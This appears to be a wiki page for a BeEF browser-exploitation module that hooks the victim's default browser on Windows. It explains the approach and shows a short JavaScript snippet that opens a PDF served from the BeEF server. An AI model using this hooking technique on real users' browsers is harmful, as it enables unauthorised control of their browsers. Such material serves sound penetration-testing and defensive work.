## Summary

* **Objective**: hook the default browser on Windows
* **Authors**: saafan
* **Browsers**: All except on iOS and Mac

* [Code](https://github.com/beefproject/beef/tree/master/modules/host/hook_default_browser)

## Internal Working

This module attempts to hook the default browser by opening a PDF file in a new window. It will only hook the default browser if the current doesn't support the PDF protocol by itself.

``` js
var pdf_url =  beef.net.httpproto + '://'+beef.net.host+ ':' + beef.net.port + '/report.pdf';
window.open( pdf_url, '_blank');
```

## Feedback

